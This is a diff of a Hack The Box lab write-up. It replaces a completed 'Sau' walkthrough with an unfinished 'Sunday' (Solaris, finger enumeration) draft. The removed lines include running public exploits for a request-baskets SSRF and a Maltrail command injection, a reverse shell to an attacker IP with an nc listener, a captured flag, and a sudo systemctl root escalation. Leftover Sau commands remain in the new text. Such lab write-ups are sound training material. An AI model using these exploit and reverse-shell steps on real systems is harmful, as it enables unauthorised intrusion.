@@ -6,11 +6,7 @@ description: https://www.hackthebox.com/machines/sunday
 
 🔗 [Sunday](https://www.hackthebox.com/machines/sunday)
 
-<div align="left">
-
-<figure><img src="../.gitbook/assets/image (1).png" alt="" width="150"><figcaption><p>@hackthebox.com</p></figcaption></figure>
-
-</div>
+<div align="left"><figure><img src="../.gitbook/assets/image (1) (1).png" alt="" width="150"><figcaption><p>@hackthebox.com</p></figcaption></figure></div>
 
 <details>
 
@@ -44,17 +40,17 @@ Reconnaissance User Enumeration Password Cracking Brute Force Attack SUDO Exploi
 
 ## Task 0 - Deploy machine
 
-🎯 Target IP: `10.129.229.26`
+🎯 Target IP: `10.129.237.16`
 
 Create a directory on the Desktop with the machine's name, and inside this directory, create another directory to store the materials and outputs needed to run the machine, including the scans made with nmap.
 
 ## Task 1 - Reconnaissance
 
 <pre class="language-bash"><code class="lang-bash">su
-<strong>echo "10.129.229.26 sau.htb" >> /etc/hosts
+<strong>echo "10.129.237.16 sunday.htb" >> /etc/hosts
 </strong>
-mkdir -p htb/sau.htb
-cd htb/sau.htb
+mkdir -p htb/sunday.htb
+cd htb/sunday.htb
 mkdir {nmap,content,exploits,scripts}
 # At the end of the room
 # To clean up the last line from the /etc/hosts file
@@ -64,89 +60,125 @@ mkdir {nmap,content,exploits,scripts}
 I prefer to start recon by pinging the target, this allows us to check connectivity and get OS info.
 
 ```bash
-ping -c 3 sau.htb
-PING sau.htb (10.129.229.26) 56(84) bytes of data.
-64 bytes from sau.htb (10.129.229.26): icmp_seq=1 ttl=63 time=61.0 ms
-64 bytes from sau.htb (10.129.229.26): icmp_seq=2 ttl=63 time=59.5 ms
-64 bytes from sau.htb (10.129.229.26): icmp_seq=3 ttl=63 time=60.0 ms
+ping -c 3 sunday.htb
+PING sunday.htb (10.129.237.16) 56(84) bytes of data.
+64 bytes from sunday.htb (10.129.237.16): icmp_seq=1 ttl=254 time=53.7 ms
+64 bytes from sunday.htb (10.129.237.16): icmp_seq=2 ttl=254 time=50.8 ms
+64 bytes from sunday.htb (10.129.237.16): icmp_seq=3 ttl=254 time=54.7 ms
 ```
 
-Sending these three ICMP packets, we see that the Time To Live (TTL) is \~64 secs. this indicates that the target should be a \*nix system, while Windows systems usually have a TTL of 128 secs.
+Sending these three ICMP packets, we see that the Time To Live (TTL) isn't 64 or 128 secs. This is a little strange and googling we can see that our target is a **Solaris OS** system.
 
-### 1.1 - Which is the highest open TCP port on the target machine?
+<div align="left"><figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure></div>
+
+### 1.1 - Which open TCP port is running the `finger` service?
+
+Let's start right away with an active port scan with nmap
 
 ```bash
-nmap -p0- -sS -Pn -vvv sau.htb -oN nmap/tcp_port_scan
+sudo nmap -p0- -sS -Pn -T4 -vvv sunday.htb -oN nmap/tcp_port_scan
 ```
 
 ```bash
-PORT      STATE    SERVICE REASON
-22/tcp    open     ssh     syn-ack ttl 63
-80/tcp    filtered http    no-response
-8338/tcp  filtered unknown no-response
-55555/tcp open     unknown syn-ack ttl 63
+PORT      STATE SERVICE
+79/tcp    open  finger
+111/tcp   open  rpcbind
+515/tcp   open  printer
+6787/tcp  open  smc-admin
+22022/tcp open  unknown
 ```
 
-<table><thead><tr><th width="154.99999999999997">command</th><th>result</th></tr></thead><tbody><tr><td>sS</td><td>SynScan</td></tr><tr><td>sC</td><td>run default scripts</td></tr><tr><td>sV</td><td>enumerate versions</td></tr><tr><td>A</td><td>aggressive mode</td></tr><tr><td>T4</td><td>run a bit faster</td></tr><tr><td>oN</td><td>output to file with nmap formatting</td></tr></tbody></table>
+<table><thead><tr><th width="154.99999999999997">command</th><th>result</th></tr></thead><tbody><tr><td>sT</td><td>TCP connect port scan (Default without root privilege)</td></tr><tr><td>sC</td><td>Run default scripts</td></tr><tr><td>sV</td><td>Enumerate versions</td></tr><tr><td>vvv</td><td>Verbosity</td></tr><tr><td>T4</td><td>Run a bit faster</td></tr><tr><td>oN</td><td>Output to file with nmap formatting</td></tr></tbody></table>
 
-It looks like there are 2 open TCP ports on the machine: 22, 55555 and 2 filtered TCP ports: 80, 8338.
-
-{% hint style="info" %}
-55555
-{% endhint %}
-
-### 1.2 - What is the name of the open source software that the application on 55555 is "powered by"?
+It looks like there are 5 open TCP ports on the machine: 79, 111, 515, 6787, 22022.
 
 Then, we can proceed to analyze services active on open ports:
 
 ```bash
-nmap -p22,55555 -sS -Pn -n -v -sCV -T4 sau.htb -oN nmap/service_port_scan
+sudo nmap -sV -sC -p 79,111,515,6787,22022 sunday.htb -oN nmap/service_port_scan
 ```
 
 ```bash
 PORT      STATE SERVICE VERSION
-22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)
-|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)
-|_  256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)
-55555/tcp open  unknown
+79/tcp    open  finger?
+|_finger: No one logged on\x0D
 | fingerprint-strings: 
-|   FourOhFourRequest: 
-|     HTTP/1.0 400 Bad Request
-|     Content-Type: text/plain; charset=utf-8
-|     X-Content-Type-Options: nosniff
-|     Date: Sat, 09 Nov 2024 14:27:59 GMT
-|     Content-Length: 75
-|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
-|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
-|     HTTP/1.1 400 Bad Request
-|     Content-Type: text/plain; charset=utf-8
-|     Connection: close
-|     Request
+|   GenericLines: 
+|     No one logged on
 |   GetRequest: 
-|     HTTP/1.0 302 Found
-|     Content-Type: text/html; charset=utf-8
-|     Location: /web
-|     Date: Sat, 09 Nov 2024 14:27:33 GMT
-|     Content-Length: 27
-|     href="/web">Found</a>.
+|     Login Name TTY Idle When Where
+|     HTTP/1.0 ???
 |   HTTPOptions: 
-|     HTTP/1.0 200 OK
-|     Allow: GET, OPTIONS
-|     Date: Sat, 09 Nov 2024 14:27:33 GMT
-|_    Content-Length: 0
+|     Login Name TTY Idle When Where
+|     HTTP/1.0 ???
+|     OPTIONS ???
+|   Help: 
+|     Login Name TTY Idle When Where
+|     HELP ???
+|   RTSPRequest: 
+|     Login Name TTY Idle When Where
+|     OPTIONS ???
+|     RTSP/1.0 ???
+|   SSLSessionReq, TerminalServerCookie: 
+|_    Login Name TTY Idle When Where
+111/tcp   open  rpcbind 2-4 (RPC #100000)
+515/tcp   open  printer
+6787/tcp  open  http    Apache httpd
+|_http-server-header: Apache
+|_http-title: 400 Bad Request
+22022/tcp open  ssh     OpenSSH 8.4 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 aa:00:94:32:18:60:a4:93:3b:87:a4:b6:f8:02:68:0e (RSA)
+|_  256 da:2a:6c:fa:6b:b1:ea:16:1d:a6:54:a1:0b:2b:ee:48 (ED25519)
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port79-TCP:V=7.94SVN%I=7%D=11/24%Time=6743B8CD%P=x86_64-pc-linux-gnu%r(
+SF:GenericLines,12,"No\x20one\x20logged\x20on\r\n")%r(GetRequest,93,"Login
+SF:\x20\x20\x20\x20\x20\x20\x20Name\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
+SF:0\x20\x20\x20\x20\x20TTY\x20\x20\x20\x20\x20\x20\x20\x20\x20Idle\x20\x2
+SF:0\x20\x20When\x20\x20\x20\x20Where\r\n/\x20\x20\x20\x20\x20\x20\x20\x20
+SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\nGET\x20\x
+SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
+SF:?\?\?\r\nHTTP/1\.0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
+SF:x20\?\?\?\r\n")%r(Help,5D,"Login\x20\x20\x20\x20\x20\x20\x20Name\x20\x2
+SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20TTY\x20\x20\x20\x2
+SF:0\x20\x20\x20\x20\x20Idle\x20\x20\x20\x20When\x20\x20\x20\x20Where\r\nH
+SF:ELP\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
+SF:\x20\?\?\?\r\n")%r(HTTPOptions,93,"Login\x20\x20\x20\x20\x20\x20\x20Nam
+SF:e\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20TTY\x20\x2
+SF:0\x20\x20\x20\x20\x20\x20\x20Idle\x20\x20\x20\x20When\x20\x20\x20\x20Wh
+SF:ere\r\n/\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
+SF:0\x20\x20\x20\x20\x20\?\?\?\r\nHTTP/1\.0\x20\x20\x20\x20\x20\x20\x20\x2
+SF:0\x20\x20\x20\x20\x20\x20\?\?\?\r\nOPTIONS\x20\x20\x20\x20\x20\x20\x20\
+SF:x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\n")%r(RTSPRequest,93,"Login\x20
+SF:\x20\x20\x20\x20\x20\x20Name\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
+SF:0\x20\x20\x20\x20TTY\x20\x20\x20\x20\x20\x20\x20\x20\x20Idle\x20\x20\x2
+SF:0\x20When\x20\x20\x20\x20Where\r\n/\x20\x20\x20\x20\x20\x20\x20\x20\x20
+SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\nOPTIONS\x20\x
+SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\nRTSP/1\
+SF:.0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\n")%
+SF:r(SSLSessionReq,5D,"Login\x20\x20\x20\x20\x20\x20\x20Name\x20\x20\x20\x
+SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20TTY\x20\x20\x20\x20\x20\x
+SF:20\x20\x20\x20Idle\x20\x20\x20\x20When\x20\x20\x20\x20Where\r\n\x16\x03
+SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
+SF:0\x20\x20\?\?\?\r\n")%r(TerminalServerCookie,5D,"Login\x20\x20\x20\x20\
+SF:x20\x20\x20Name\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
+SF:\x20TTY\x20\x20\x20\x20\x20\x20\x20\x20\x20Idle\x20\x20\x20\x20When\x20
+SF:\x20\x20\x20Where\r\n\x03\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
+SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\n");
+
 ```
 
-Strangely enough, port 80 is filtered, but there seems to be some relationship with the service active on port 55555, let's go and see.
+Good, finger protocols was found, while we can see another two interesting services actives: webserver on port 6787 and OpenSSH on port 22022.
 
-Browsing it:  [`http://sau.htb:55555/web`](http://sau.htb:55555/web)  we see that there's up a web app to create a basket to collect and inspect HTTP requests. using request-baskets app vs 1.2.1.
+Browsing it:  [`https://sunday.htb:6787/`](https://sunday.htb:6787/solaris/login/) we see a Solaris login page:
 
-<figure><img src="../.gitbook/assets/image (343).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/image (345).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/image (346).png" alt=""><figcaption></figcaption></figure>
+
+
+
+
 
 ```bash
 whatweb sau.htb:55555
@@ -160,120 +192,106 @@ gobuster dir -u http://sau.htb:55555 -w /usr/share/wordlists/dirb/common.txt
 
 We discover only this web dir: `/web (Status: 200)` that unfortunely corrispond to our index page.
 
+
+
+
+
+
+
+Default TCP port 79 is running the finger service.
+
 {% hint style="info" %}
-request-baskets
+79
 {% endhint %}
 
-### 1.3 - What is the version of request-baskets running on Sau?
+### 1.2 - How many users can be found by enumerating the finger service? Consider only users who shows a pts?
 
-<div align="left">
+#### How function finger service?
 
-<figure><img src="../.gitbook/assets/image (347).png" alt=""><figcaption></figcaption></figure>
 
-</div>
+
+
+
+
+
+{% embed url="https://github.com/dev-angelist/Finger-User-Enumeration" %}
+
+
 
 {% hint style="info" %}
-1.2.1
+2
+{% endhint %}
+
+### 1.3 - What is the password for the sunny user on Sunday?
+
+
+
+
+
+
+
+{% hint style="info" %}
+
 {% endhint %}
 
 ## Task 2 - Find user flag
 
-### 2.1 -  What is the 2023 CVE ID for a Server-Side Request Forgery (SSRF) in this version of request-baskets?
+### 2.1 - &#x20;
 
-Googling 'request-baskets 1.2.1' we discover that's vulnerable to a recent CVE via an [SSRF](https://portswigger.net/web-security/ssrf) attack.
 
-{% embed url="https://nvd.nist.gov/vuln/detail/CVE-2023-27163" %}
 
-{% embed url="https://github.com/entr0pie/CVE-2023-27163" %}
 
-{% hint style="info" %}
-CVE-2023-27163
-{% endhint %}
 
-After understanding [PoC](https://github.com/entr0pie/CVE-2023-27163/blob/main/README.md) and reading details regarding usage:
 
-<figure><img src="../.gitbook/assets/image (350).png" alt=""><figcaption></figcaption></figure>
 
-we can download CVE-2023-27163.sh and execute it exploiting our vulnerability:
 
-```bash
-wget https://raw.githubusercontent.com/entr0pie/CVE-2023-27163/main/CVE-2023-27163.sh
-chmod +x CVE-2023-27163.sh
-./CVE-2023-27163.sh http://sau.htb:55555 http://sau.htb:80
-```
 
-<figure><img src="../.gitbook/assets/image (355).png" alt=""><figcaption></figcaption></figure>
-
-and now we can concatenate basket value to our URL and finally reach filtered port 80: [http://sau.htb:55555/hbvoml](http://sau.htb:55555/hbvoml)
-
-<figure><img src="../.gitbook/assets/image (353).png" alt=""><figcaption></figcaption></figure>
-
-![](<../.gitbook/assets/image (354).png>)\
 
 
 {% hint style="info" %}
-maltrail
+
 {% endhint %}
 
-### 2.2 -  There is an unauthenticated command injection vulnerability in MailTrail v0.53. What is the relative path targeted by this exploit?
+### 2.2 - &#x20;
 
 \
-Googling 'MailTrail v0.53' we discover that's vulnerable to an unauthenticated OS Command Injection (RCE)
-
-{% embed url="https://github.com/spookier/Maltrail-v0.53-Exploit" %}
-
-the `username` parameter of the **login page** doesn't properly sanitize the input, allowing an attacker to inject OS commands.
-
-The exploit creates a reverse shell payload encoded in Base64 to bypass potential protections like WAF, IPS or IDS and delivers it to the target URL using a curl command The payload is then executed on the target system, establishing a reverse shell connection back to the attacker's specified IP and port.
-
-<figure><img src="../.gitbook/assets/image (356).png" alt=""><figcaption></figcaption></figure>
-
 Attacker machine:
 
 ```bash
-#first check our IP using ip a
-nc -nvlp 4444
 ```
 
-Target Machine
 
-```bash
-python3 exploit.py 10.10.14.6 4444 http://sau.htb:55555/hbvoml
-```
-
-<figure><img src="../.gitbook/assets/image (357).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
-/login
+
 {% endhint %}
 
-### 2.3 -  What user is the Mailtrack application running as on Sau?
+### 2.3 -&#x20;
 
-Taking a little system enumeration (whoami and/or id) we can check user active on machine
 
-<div align="left">
 
-<figure><img src="../.gitbook/assets/image (358).png" alt=""><figcaption></figcaption></figure>
 
-</div>
+
+
 
 {% hint style="info" %}
-puma
+
 {% endhint %}
 
-### 2.4 - Submit the flag located in the puma user's home directory.
+### 2.4 -&#x20;
+
+
+
+
 
 ```bash
-cd ~
-ll
-cat user.txt
 ```
 
 <details>
 
 <summary>🚩 Flag 1 (user.txt)</summary>
 
-8fa7f7719f0e91d9d63187d1b074c457
+
 
 </details>
 
@@ -315,11 +333,7 @@ then, only executing: `sudo /usr/bin/systemctl status trail.service`
 
 and adding `!sh`  we can spawn a new shell, directly with root privileges.
 
-<div align="left">
-
-<figure><img src="../.gitbook/assets/image (362).png" alt=""><figcaption></figcaption></figure>
-
-</div>
+<div align="left"><figure><img src="../.gitbook/assets/image (362).png" alt=""><figcaption></figcaption></figure></div>
 
 {% hint style="info" %}
 CVE-2023-26604
